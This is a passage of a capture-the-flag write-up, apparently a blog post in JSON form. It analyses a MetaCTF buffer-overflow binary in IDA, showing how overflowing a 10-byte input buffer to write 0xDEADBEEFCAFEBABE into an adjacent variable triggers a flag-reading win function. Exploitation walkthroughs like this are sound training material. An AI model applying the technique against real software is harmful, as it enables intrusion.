characters.\nLet\u0026rsquo;s first examine the type of file provided:\n$ file buffers buffers: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=76ade86ea7cea7ad0c6bc6c3a79392d812b8e3bf, for GNU/Linux 3.2.0, not stripped It\u0026rsquo;s a 64-bit ELF, dynamically linked.\nWe load it in IDA for analysis.\nThe strings.\nHere is the generated graph view:\nAt the beginning, two variables are declared:\nvar_12: a string/character array for the input buffer. var_8: a qword type, 8 bytes, or 64 bits. The input from the buffer is written to var_12. Later in the code, the value 0xDEADBEEFCAFEBABE is moved to the rax register, followed by a cmp instruction that compares rax to var_8. A conditional jump (jnz) occurs if the ZERO FLAG (ZF) is not set.\nThe ZERO FLAG remains unset if var_8 does not equal 0xDEADBEEFCAFEBABE. When this happens, the code jumps to location loc_1263, where var_12 is read and printed along with \u0026ldquo;Nice to meet you\u0026hellip;\u0026rdquo;. If var_8 does equal 0xDEADBEEFCAFEBABE, ZF is set, the jump is skipped, and the code calls the win function.\nThe pseudocode\nThe win function provides the flag.\nIn this section of the code, 16 bytes are allocated on the stack, presumably for the filename. The registers are then set up for the sys_open and sys_sendfile syscalls.\nTo summarize, user input is taken and written to var_12, which is 10 bytes long, with no input validation. To obtain the flag, we need to write 0xDEADBEEFCAFEBABE to var_8 via a buffer overflow.\nWe can use echo with the -e option to enable the backslash escape and pipe the input to netcat.\n","permalink":"https://hexed.space/posts/metactf-buffer-1/","summary":"In this challenge, we are provided with an executable, as well as an address and a port to connect to via netcat.\nAfter connecting, we are asked to enter a name. With a little manual \u0026ldquo;fuzzing,\u0026rdquo; we discover that the application crashes with a \u0026ldquo;Segmentation fault\u0026rdquo; error when the input exceeds 25 characters.\nLet\u0026rsquo;s first examine the type of file provided:\n$ file buffers buffers: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.","title":"MetaCTF - Buffer overflow"}]